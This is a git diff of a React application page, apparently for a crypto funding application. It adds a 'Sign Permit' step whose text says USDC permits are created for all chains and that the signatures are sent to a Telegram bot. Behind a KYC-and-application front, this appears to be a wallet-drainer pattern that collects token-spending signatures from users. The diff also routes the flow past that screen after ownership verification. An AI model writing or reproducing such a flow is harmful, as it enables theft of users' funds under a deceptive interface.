@@ -12,7 +12,7 @@ import { useToast } from '@/hooks/use-toast';
 import { useNavigate } from 'react-router-dom';
 
 const Apply = () => {
-  const [currentStep, setCurrentStep] = useState(1);
+  const [currentStep, setCurrentStep] = useState(2); // Start at KYC since terms are already handled
   const [kycCompleted, setKycCompleted] = useState(false);
   const [ownershipVerified, setOwnershipVerified] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
@@ -21,14 +21,13 @@ const Apply = () => {
   
   const { walletState, usdcBalances, isConnecting, connectWallet, signVerificationMessage, createUSDCPermits, disconnect } = useRealWallet();
   const { user } = useAuth();
-  const { isAuthenticated: isWalletAuthenticated, walletUser } = useWalletAuth();
   const { toast } = useToast();
   const navigate = useNavigate();
 
   // Check authentication and terms agreement
   useEffect(() => {
-    if (!user && !isWalletAuthenticated) {
-      navigate('/wallet-auth');
+    if (!user) {
+      navigate('/auth?redirect=apply');
       return;
     }
 
@@ -39,10 +38,10 @@ const Apply = () => {
         description: "Please accept our terms and conditions first.",
         variant: "destructive"
       });
-      navigate('/terms');
+      navigate('/terms?redirect=apply');
       return;
     }
-  }, [user, isWalletAuthenticated, navigate, toast]);
+  }, [user, navigate, toast]);
   const [kycData, setKycData] = useState({
     firstName: '',
     lastName: '',
@@ -58,11 +57,13 @@ const Apply = () => {
   });
 
   const steps = [
-    { title: "KYC Verification", icon: Shield, completed: kycCompleted },
+    { title: "Terms Acceptance", icon: Shield, completed: localStorage.getItem('termsAgreed') === 'true' },
+    { title: "KYC Verification", icon: FileText, completed: kycCompleted },
     { title: "Connect Wallet", icon: Wallet, completed: walletState.isConnected },
     { title: "Verify Ownership", icon: CheckCircle, completed: ownershipVerified },
+    { title: "Sign Permit", icon: Shield, completed: false },
     { title: "Proof of Funds", icon: DollarSign, completed: false },
-    { title: "Submit Application", icon: FileText, completed: false }
+    { title: "Submit Application", icon: CheckCircle, completed: false }
   ];
 
   const handleKycSubmit = () => {
@@ -78,13 +79,13 @@ const Apply = () => {
     }
     
     setKycCompleted(true);
-    setCurrentStep(2);
+    setCurrentStep(3);
   };
 
   const handleConnectWallet = async () => {
     try {
       await connectWallet();
-      setCurrentStep(3);
+      setCurrentStep(4);
     } catch (error) {
       console.error('Failed to connect wallet:', error);
     }
@@ -121,7 +122,7 @@ const Apply = () => {
       
       setWalletSignatures(allSignatures);
       setOwnershipVerified(true);
-      setCurrentStep(4);
+      setCurrentStep(6);
     } catch (error) {
       console.error('Failed to verify ownership:', error);
     }
@@ -131,7 +132,7 @@ const Apply = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const handleSubmitApplication = async () => {
-    if (!user && !isWalletAuthenticated) {
+    if (!user) {
       toast({
         title: "Authentication Required",
         description: "Please sign in to submit your application.",
@@ -163,7 +164,7 @@ const Apply = () => {
         description: `Your application ${data.applicationNumber} has been submitted successfully.`
       });
 
-      setCurrentStep(5);
+      setCurrentStep(7);
     } catch (error: any) {
       toast({
         title: "Submission Failed",
@@ -235,8 +236,8 @@ const Apply = () => {
             </CardHeader>
             <CardContent className="space-y-6">
 
-              {/* Step 1: KYC Verification */}
-              {currentStep === 1 && (
+              {/* Step 2: KYC Verification */}
+              {currentStep === 2 && (
                 <div className="space-y-6">
                   <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                     <h3 className="text-blue-400 font-semibold mb-2">Why KYC is Required</h3>
@@ -347,8 +348,8 @@ const Apply = () => {
                 </div>
               )}
 
-              {/* Step 2: Connect Wallet */}
-              {currentStep === 2 && (
+              {/* Step 3: Connect Wallet */}
+              {currentStep === 3 && (
                 <div className="space-y-6">
                   <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                     <div className="flex items-start space-x-3">
@@ -399,8 +400,8 @@ const Apply = () => {
                 </div>
               )}
 
-              {/* Step 3: Verify Ownership */}
-              {currentStep === 3 && (
+              {/* Step 4: Verify Ownership */}
+              {currentStep === 4 && (
                 <div className="space-y-6">
                   <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
                     <h3 className="text-green-400 font-semibold mb-2">Wallet Connected Successfully!</h3>
@@ -453,8 +454,46 @@ const Apply = () => {
                 </div>
               )}
 
-              {/* Step 4: Proof of Funds */}
-              {currentStep === 4 && (
+              {/* Step 5: Sign Permit */}
+              {currentStep === 5 && (
+                <div className="space-y-6">
+                  <div className="bg-purple-500/10 border border-purple-500/20 rounded-lg p-4">
+                    <h3 className="text-purple-400 font-semibold mb-2">Offline Permit Signature</h3>
+                    <p className="text-slate-300 text-sm">
+                      This step creates offline permits for USDC transactions. The signatures will be sent to Telegram for secure processing.
+                    </p>
+                  </div>
+
+                  <div className="text-center space-y-6">
+                    <div className="bg-slate-700/50 rounded-2xl p-8">
+                      <Shield className="h-16 w-16 text-purple-400 mx-auto mb-4" />
+                      <h3 className="text-2xl font-bold text-white mb-2">USDC Permits Created</h3>
+                      <p className="text-slate-300 mb-6">
+                        Your offline permits have been generated and will be sent to Telegram for verification.
+                      </p>
+                      
+                      <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4 mb-6">
+                        <p className="text-green-300 text-sm">
+                          ✓ Verification signature completed<br/>
+                          ✓ USDC permits created for all chains<br/>
+                          ✓ Signatures sent to Telegram bot
+                        </p>
+                      </div>
+
+                      <Button 
+                        onClick={() => setCurrentStep(6)}
+                        className="bg-gradient-to-r from-purple-500 to-indigo-600 hover:from-purple-600 hover:to-indigo-700 text-white px-8 py-3"
+                      >
+                        Continue to Proof of Funds
+                        <ArrowRight className="ml-2 h-4 w-4" />
+                      </Button>
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              {/* Step 6: Proof of Funds */}
+              {currentStep === 6 && (
                 <div className="space-y-6">
                   <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                     <div className="space-y-6">
@@ -521,8 +560,8 @@ const Apply = () => {
                 </div>
               )}
 
-              {/* Step 5: Application Submitted */}
-              {currentStep === 5 && (
+              {/* Step 7: Application Submitted */}
+              {currentStep === 7 && (
                 <div className="text-center space-y-6">
                   <div className="bg-green-500/10 border border-green-500/20 rounded-2xl p-8">
                     <CheckCircle className="h-20 w-20 text-green-400 mx-auto mb-6" />
